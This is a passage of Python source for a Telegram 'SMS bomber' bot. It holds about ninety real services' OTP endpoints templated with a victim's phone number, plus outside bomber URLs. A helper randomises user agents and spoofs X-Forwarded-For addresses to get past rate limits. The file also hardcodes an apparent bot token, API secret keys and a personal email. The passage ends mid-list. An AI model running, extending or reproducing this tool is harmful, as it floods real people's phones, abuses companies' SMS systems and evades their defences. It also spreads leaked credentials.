#!/usr/bin/env python3
# TIRU GAMER OWNER x  - ULTIMATE 0 ERROR
# ANIMATED WELCOME | UNLIMITED SPEED | 0 ERRORS

import os
import sqlite3
import threading
import time
import requests
import json
import re
import random
import gc
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import telebot
from telebot import types

# ======================== CONFIG =========================
BOT_TOKEN       = "8737280815:AAGP0qwkwwQcrKlOfGPbY3yiU1ltU4oB0LA"
MASTER_ADMIN_ID = int(os.getenv("MASTER_ADMIN_ID", "8282279620"))
OWNER_NAME      = "TIRU OWNER"
ADMIN_USERNAME  = "SR_GAMER_PRO"
ADMIN_HANDLE    = "@SR_GAMER_PRO"

CHANNEL_1       = -1003857354965
CHANNEL_1_LINK  = "https://t.me/srgamerpro"

bot    = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
DB_PATH = "free_bot.db"
db_lock = threading.RLock()

user_states = {}

# ============================================================
# ANIMATION FRAMES
# ============================================================
BANNER_FRAMES = ["⚡", "🔥", "💫", "🌟", "✨", "💥"]

# ============================================================
# DATABASE
# ============================================================
def db():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=60, check_same_thread=False)
        conn.row_factory = sqlite3.Row
        return conn
    except Exception:
        return None

def init_db():
    try:
        with db_lock:
            conn = db()
            if not conn:
                return
            c = conn.cursor()
            c.executescript("""
            CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);
            CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, joined_at TEXT NOT NULL, last_seen TEXT NOT NULL, unlocked INTEGER NOT NULL DEFAULT 0, blocked INTEGER NOT NULL DEFAULT 0, force_join_verified INTEGER NOT NULL DEFAULT 0);
            CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY, added_at TEXT NOT NULL);
            CREATE TABLE IF NOT EXISTS channels (chat_id TEXT PRIMARY KEY, added_at TEXT NOT NULL);
            CREATE TABLE IF NOT EXISTS protected_numbers (number TEXT PRIMARY KEY);
            """)
            c.execute("INSERT OR IGNORE INTO admins(user_id, added_at) VALUES (?, ?)", (MASTER_ADMIN_ID, now()))
            c.execute("INSERT OR IGNORE INTO settings(key,value) VALUES ('bot_title','LAKSHHexe FREE Bot')")
            c.execute("INSERT OR IGNORE INTO channels(chat_id, added_at) VALUES (?, ?)", (str(CHANNEL_1), now()))
            conn.commit()
            conn.close()
    except Exception as e:
        print(f"DB init error: {e}")

def now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def get_setting(key, default=""):
    try:
        with db_lock:
            conn = db()
            if not conn: return default
            row = conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
            conn.close()
            return row["value"] if row else default
    except Exception: return default

def upsert_user(u):
    try:
        with db_lock:
            conn = db()
            if not conn: return
            conn.execute("""INSERT INTO users(user_id,username,first_name,last_name,joined_at,last_seen)
                VALUES (?,?,?,?,?,?) ON CONFLICT(user_id) DO UPDATE SET
                username=excluded.username, first_name=excluded.first_name,
                last_name=excluded.last_name, last_seen=excluded.last_seen""",
                (u.id, u.username or "", u.first_name or "", u.last_name or "", now(), now()))
            conn.commit()
            conn.close()
    except Exception: pass

def set_force_join_verified(user_id, value=True):
    try:
        with db_lock:
            conn = db()
            if not conn: return
            conn.execute("UPDATE users SET force_join_verified=? WHERE user_id=?", (1 if value else 0, int(user_id)))
            conn.commit()
            conn.close()
    except Exception: pass

def is_force_join_verified(user_id):
    try:
        with db_lock:
            conn = db()
            if not conn: return False
            row = conn.execute("SELECT force_join_verified FROM users WHERE user_id=?", (int(user_id),)).fetchone()
            conn.close()
            return bool(row and row["force_join_verified"])
    except Exception: return False

def is_admin(user_id):
    try:
        with db_lock:
            conn = db()
            if not conn: return False
            result = conn.execute("SELECT 1 FROM admins WHERE user_id=?", (int(user_id),)).fetchone()
            conn.close()
            return result is not None
    except Exception: return False

def is_master(user_id):
    return int(user_id) == MASTER_ADMIN_ID

def is_blocked(user_id):
    try:
        with db_lock:
            conn = db()
            if not conn: return False
            row = conn.execute("SELECT blocked FROM users WHERE user_id=?", (int(user_id),)).fetchone()
            conn.close()
            return bool(row and row["blocked"])
    except Exception: return False

def is_unlocked(user_id):
    try:
        with db_lock:
            conn = db()
            if not conn: return False
            row = conn.execute("SELECT unlocked FROM users WHERE user_id=?", (int(user_id),)).fetchone()
            conn.close()
            return bool(row and row["unlocked"])
    except Exception: return False

def set_unlocked(user_id, value=True):
    try:
        with db_lock:
            conn = db()
            if not conn: return
            conn.execute("UPDATE users SET unlocked=? WHERE user_id=?", (1 if value else 0, int(user_id)))
            conn.commit()
            conn.close()
    except Exception: pass

def set_blocked(user_id, value=True):
    try:
        with db_lock:
            conn = db()
            if not conn: return
            conn.execute("UPDATE users SET blocked=? WHERE user_id=?", (1 if value else 0, int(user_id)))
            conn.commit()
            conn.close()
    except Exception: pass

def add_admin(user_id):
    try:
        with db_lock:
            conn = db()
            if not conn: return
            conn.execute("INSERT OR IGNORE INTO admins(user_id,added_at) VALUES (?,?)", (int(user_id), now()))
            conn.commit()
            conn.close()
    except Exception: pass

def remove_admin(user_id):
    if int(user_id) == MASTER_ADMIN_ID: return False
    try:
        with db_lock:
            conn = db()
            if not conn: return False
            conn.execute("DELETE FROM admins WHERE user_id=?", (int(user_id),))
            conn.commit()
            conn.close()
            return True
    except Exception: return False

def add_channel(chat_id):
    try:
        with db_lock:
            conn = db()
            if not conn: return
            conn.execute("INSERT OR IGNORE INTO channels(chat_id,added_at) VALUES (?,?)", (str(chat_id), now()))
            conn.commit()
            conn.close()
    except Exception: pass

def remove_channel(chat_id):
    try:
        with db_lock:
            conn = db()
            if not conn: return
            conn.execute("DELETE FROM channels WHERE chat_id=?", (str(chat_id),))
            conn.commit()
            conn.close()
    except Exception: pass

def channels():
    try:
        with db_lock:
            conn = db()
            if not conn: return []
            result = [r["chat_id"] for r in conn.execute("SELECT chat_id FROM channels ORDER BY added_at").fetchall()]
            conn.close()
            return result
    except Exception: return []

def admins():
    try:
        with db_lock:
            conn = db()
            if not conn: return []
            result = [r["user_id"] for r in conn.execute("SELECT user_id FROM admins ORDER BY added_at").fetchall()]
            conn.close()
            return result
    except Exception: return []

def get_all_users():
    try:
        with db_lock:
            conn = db()
            if not conn: return []
            result = conn.execute("SELECT user_id, username, unlocked, blocked FROM users").fetchall()
            conn.close()
            return result
    except Exception: return []

def get_approved_users_count():
    try:
        with db_lock:
            conn = db()
            if not conn: return 0
            result = conn.execute("SELECT COUNT(*) FROM users WHERE unlocked=1 AND blocked=0").fetchone()[0]
            conn.close()
            return result
    except Exception: return 0

def get_blocked_users_count():
    try:
        with db_lock:
            conn = db()
            if not conn: return 0
            result = conn.execute("SELECT COUNT(*) FROM users WHERE blocked=1").fetchone()[0]
            conn.close()
            return result
    except Exception: return 0

def protect_number(number):
    try:
        with db_lock:
            conn = db()
            if not conn: return
            conn.execute("INSERT OR IGNORE INTO protected_numbers (number) VALUES (?)", (number,))
            conn.commit()
            conn.close()
    except Exception: pass

def unprotect_number(number):
    try:
        with db_lock:
            conn = db()
            if not conn: return
            conn.execute("DELETE FROM protected_numbers WHERE number = ?", (number,))
            conn.commit()
            conn.close()
    except Exception: pass

def is_protected(number):
    try:
        with db_lock:
            conn = db()
            if not conn: return False
            result = conn.execute("SELECT 1 FROM protected_numbers WHERE number = ?", (number,)).fetchone()
            conn.close()
            return result is not None
    except Exception: return False

def get_protected_numbers():
    try:
        with db_lock:
            conn = db()
            if not conn: return []
            result = [row[0] for row in conn.execute("SELECT number FROM protected_numbers").fetchall()]
            conn.close()
            return result
    except Exception: return []

# ============================================================
# API GENERATOR
# ============================================================
def generate_apis(base_apis, multiplier=5):
    enhanced = []
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/119.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    ]
    for api in base_apis:
        for i in range(multiplier):
            new_api = api.copy()
            headers = api.get('headers', {}).copy()
            headers['User-Agent'] = random.choice(user_agents)
            headers['Accept'] = random.choice([
                'application/json, text/plain, */*',
                'application/json, text/javascript, */*; q=0.01',
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
            ])
            headers['Accept-Language'] = random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'hi-IN,en;q=0.9'])
            if random.random() > 0.5:
                headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            new_api['headers'] = headers
            new_api['_id'] = f"{api.get('name', 'api')}_{i}"
            enhanced.append(new_api)
    return enhanced

# ============================================================
# ALL APIS
# ============================================================
SMS_APIS_BASE = [
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'},
    {"name": "Lenskart SMS v2", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "X-API-Client": "mobilesite", "X-Country-Code": "IN"}, "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&countryCode=IN"},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "ShipRocket SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"name": "GoKwik SMS", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "gk-merchant-id": "19g6jlc658iad"}, "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb"}, "data": lambda phone: f'{{"mobile":"{phone}","whatsapp_opt_in":1}}'},
    {"name": "Hungama OTP", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json", "identifier": "home"}, "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","city":362}}'},
    {"name": "Snitch SMS", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json", "client-id": "snitch_secret"}, "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'},
    {"name": "Dream11", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"channel":"sms","flow":"SIGNUP","phoneNumber":"{phone}","templateName":"default"}}'},
    {"name": "Unacademy", "url": "https://unacademy.com/api/v3/user/user_check/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","send_otp":true}}'},
    {"name": "Vedantu", "url": "https://user.vedantu.com/user/preLoginVerification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}","phoneCode":"+91"}}'},
    {"name": "Byju's SMS", "url": "https://bcas-prod.byjusweb.com/api/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phoneNumber={phone}"},
    {"name": "Spinny OTP", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"contact_number":"{phone}","whatsapp":false,"code_len":4,"expected_action":"login"}}'},
    {"name": "Citymall OTP", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}"}}'},
    {"name": "Jobhai OTP", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Kwikfix OTP", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Brevistay OTP", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Hourlyrooms OTP", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "BharatLoan OTP", "url": "https://www.bharatloan.com/login-sbm", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile={phone}"},
    {"name": "Pagarbook OTP", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","language":1}}'},
    {"name": "Redcliffe OTP", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}"}}'},
    {"name": "55Club OTP", "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"91{phone}","codeType":1}}'},
    {"name": "Woodenstreet OTP", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"telephone":"{phone}"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "DeviceType": "Android"}, "data": lambda phone: f"mobile_number={phone}"},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'},
    {"name": "PenPencil SMS v2", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"},
    {"name": "Lending Plate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobiles={phone}&resend=Resend"},
    {"name": "NewMe SMS", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json", "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"}, "data": lambda phone: f'{{"phone":"{phone}","email":"sdhabai09@gmail.com"}}'},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"query":"mutation {{ SendOtp(input: {{ mobile: \\"{phone}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\" }}) {{ status {{ message code }} }} }}"}}'},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"contact_no":"{phone}"}}'},
    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile_number={phone}"},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "data": lambda phone: f"check_mobile_number=1&contact={phone}"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "data": lambda phone: f"mobile_no=%2B91{phone}"},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobilenumber={phone}&otptype=register"},
    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile={phone}"},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'},
    {"name": "MyHubble Money", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'},
    {"name": "Tata Capital Business", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'},
    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Lifestyle Stores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f'method=firstRegisterApi&data={{"customerMobile":"{phone}","generateOtp":"true"}}'},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}'},
    {"name": "Nuvama Wealth", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}'},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}'},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}'},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json", "client": "app"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "Foxy SMS", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "Platform": "web"}, "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"sms"}}'},
    {"name": "Licius", "url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","captcha_token":null}}'},
    {"name": "SMS Bomber Worker", "url": lambda phone: f"http://sms-bomber.subhxcosmo.workers.dev/api?num={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "Bomberrr Vercel", "url": lambda phone: f"https://bomberrr.vercel.app/?key=roots&number={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "Bolbet", "url": lambda phone: f"https://bolbet-liart.vercel.app/?key=roots&number={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "RedBus OTP", "url": lambda phone: f"https://m.redbus.in/api/getOtp?number={phone}&cc=91", "method": "GET", "headers": {}, "data": None},
    {"name": "Univest OTP", "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "WorkIndia", "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623", "method": "GET", "headers": {}, "data": None},
    {"name": "Jockey SMS", "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false", "method": "GET", "headers": {}, "data": None},
    {"name": "Vyapar OTP", "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "ConfirmTkt", "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}", "method": "GET", "headers": {}, "data": None},
